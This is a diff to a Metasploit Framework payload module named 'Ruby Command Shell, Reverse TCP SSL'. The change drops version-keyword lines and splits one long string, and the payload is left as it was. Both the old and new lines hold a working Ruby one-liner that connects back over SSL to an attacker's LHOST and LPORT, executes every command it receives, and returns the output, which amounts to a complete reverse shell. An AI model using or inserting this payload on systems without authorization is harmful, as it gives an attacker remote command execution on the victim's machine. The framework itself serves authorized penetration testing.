@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -24,7 +20,6 @@ module Metasploit3
 	def initialize(info = {})
 		super(merge_info(info,
 			'Name'        => 'Ruby Command Shell, Reverse TCP SSL',
-			'Version'     => '$Revision$',
 			'Description' => 'Connect back and create a command shell via Ruby, uses SSL',
 			'Author'      => 'RageLtMan',
 			'License'     => MSF_LICENSE,
@@ -46,7 +41,9 @@ module Metasploit3
 	def ruby_string
 		lhost = datastore['LHOST']
 		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-		rbs = "require 'socket';require 'openssl';c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new(\"#{lhost}\",\"#{datastore['LPORT']}\")).connect;while(cmd=c.gets);IO.popen(cmd.to_s,\"r\"){|io|c.print io.read}end"
+		rbs = "require 'socket';require 'openssl';c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new(\"#{lhost}\","
+		rbs << "\"#{datastore['LPORT']}\")).connect;while(cmd=c.gets);IO.popen(cmd.to_s,\"r\"){|io|c.print io.read}end"
 		return rbs
 	end
+
 end
